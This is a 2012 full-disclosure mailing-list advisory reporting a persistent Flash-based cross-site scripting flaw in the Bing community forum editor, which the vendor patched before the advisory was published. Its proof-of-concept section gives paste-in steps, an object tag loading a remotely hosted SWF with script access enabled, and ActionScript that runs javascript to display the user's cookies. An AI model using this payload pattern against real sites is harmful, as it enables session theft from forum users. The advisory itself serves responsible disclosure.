
Date: Thu, 15 Mar 2012 18:25:10 +0100
From: Research <research@...nerability-lab.com>
To: full-disclosure@...ts.grok.org.uk
Subject: Microsoft Bing - Editor Flash Component
	Vulnerability

Title:
======
Microsoft Bing - Editor Flash Component Vulnerability


Date:
=====
2012-03-15


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=449

MSRC ID#1: 12173
MSRC ID#2: 12227

Credits: http://technet.microsoft.com/en-us/security/cc308589



VL-ID:
=====
449


Introduction:
=============
Bing (formerly Live Search, Windows Live Search, and MSN Search) is a web search engine (advertised as a 
decision engine) from Microsoft. Bing was unveiled by Microsoft CEO Steve Ballmer on May 28, 2009 at the 
All Things Digital conference in San Diego. It went fully online on June 3, 2009, with a preview version 
released on June 1, 2009. Notable changes include the listing of search suggestions as queries are entered 
and a list of related searches (called Explore pane) based on semantic technology from Powerset that Microsoft 
purchased in 2008. On July 29, 2009, Microsoft and Yahoo! announced a deal in which Bing would power Yahoo! Search. 
All Yahoo! Search global customers and partners are expected to have made the transition by early 2012.
In October 2011, Bing announced it is working on new back-end search infrastructure, with the goal of delivering 
faster and slightly more relevant search results for users. Known as “Tiger,” the new index-serving technology is 
being incorporated into Bing globally starting in August 2011.

(Copy of the Vendor Homepage: http://en.wikipedia.org/wiki/Bing )


Abstract:
=========
3 Vulnerability Laboratory Researchers discovered a critical editor flash component vulnerability on Microsofts Bing Service Application.


Report-Timeline:
================
2012-02-07:	Vendor Notification
2012-02-09:	Vendor Response/Feedback
2012-03-14:	Vendor Fix/Patch 
2012-03-15:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Critical


Details:
========
A persistent flash componente input validation vulnerability is detected on Microsofts Bing Service Application.
The vulnerability allows an attacker to implement malicious persistent comments when the user is editing or posting through Flash.
The vulnerability is located on the htmleditor input/output when processing to load manipualtes swf files which were created 
with flash action script.

Vulnerable Module(s):
                                                           [+] Comments & Edit - Flash Input/Output (Editor-HTML|Dev-Kit)

Picture(s):
                                                           ../1.png
                                                           ../2.png
                                                           ../3.png


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...

1) Either comment or start a new thread (http://www.bing.com/community/developer/f/13214/p/addpost.aspx).
2) Click on the html button, through which you can enter html source directly "HTML Source editor"
3) Paste the exploit code:


       <object type="application/x-shockwave-flash" data="http://www.subhohalder.com/xysecteam.swf" width="300" height="300">
           <param name="movie" value="http://www.subhohalder.com/xysecteam.swf" />
                 <param name="quality" value="high" />
                 <param name="scale" value="noscale" />
                 <param name="salign" value="LT" />
       <param name="allowScriptAccess" value="always" />
                 <param name="menu" value="false" />
            </object>


4) Click on update, and the document.cookie pop ups in alert

the vulnerable SWF is compiled from an ActionScript with the following code:


       class Main {

       static function main() {

       getURL('javascript:alert("XYSEC Team "+document.cookie)');

       }    }


Reference(s):
                                                           ../poc1.zip


Risk:
=====
The security risk of the persistent flash componente is estimated as critical.


Credits:
========
Vulnerability Laboratory Researcher   -    Subho Halder,   Aditya Gupta   &   Dev Kar 


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2012|Vulnerability-Lab





_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/